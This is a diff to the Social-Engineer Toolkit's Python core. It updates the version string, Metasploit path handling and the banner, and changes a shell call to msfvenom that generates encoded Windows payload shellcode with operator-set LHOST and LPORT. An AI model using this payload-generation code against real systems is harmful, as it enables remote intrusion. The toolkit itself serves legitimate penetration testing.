@@ -233,7 +233,7 @@ def print_error(message):
     print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC
 
 def get_version():
-    define_version = '6.5'
+    define_version = '6.5.1'
     return define_version
 
 class create_menu:
@@ -290,7 +290,8 @@ def meta_path():
 
                 # specific for kali linux
                 if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
-                    msf_path = "/opt/metasploit/apps/pro/msf3/"
+		    # left blank since you can call launcher and ruby1.9 - 2x issues are there
+                    msf_path = ""
                     trigger = 1
 
                 # specific for backtrack5 and other backtrack versions
@@ -779,7 +780,7 @@ def show_banner(define_version,graphic):
     print bcolors.BLUE + """
 [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
 [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
-[---]                  Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                    [---]
+[---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                   [---]
 [---]               Codename: '""" + bcolors.YELLOW + """Mr. Robot""" + bcolors.BLUE + """'              [---]
 [---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@TrustedSec""" + bcolors.BLUE+"""         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@HackingDave""" + bcolors.BLUE+"""        [---]
@@ -1272,7 +1273,7 @@ def generate_shellcode(payload,ipaddr,port):
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows -f c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows -f c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
     repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'unsigned char buf=' : '', 'unsignedcharbuf[]=' : ''}
